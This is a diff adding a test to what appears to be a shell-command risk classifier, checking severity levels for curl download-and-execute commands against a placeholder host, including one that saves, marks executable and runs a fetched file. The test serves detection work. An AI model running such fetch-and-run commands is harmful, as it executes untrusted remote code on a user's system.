@@ -64,6 +64,12 @@ def test_sim_bot_drop_is_high_until_it_runs():
     assert apply("med", level_for_command(drop, []), "malicious") == "high"
 
 
+def test_running_a_file_curl_never_saved_is_not_a_payload():
+    assert level_for_command("curl -s http://a.b/redtail; ./redtail", []) == "high"
+    assert level_for_command("curl -sO http://a.b/redtail; chmod +x redtail; ./redtail", []) == "critical"
+    assert level_for_command("curl -s http://a.b/k > /tmp/k; /tmp/k", []) == "critical"
+
+
 def test_malicious_bumps_one_level():
     assert apply("low", "low", "malicious") == "med"
     assert apply("low", "med", "malicious") == "high"
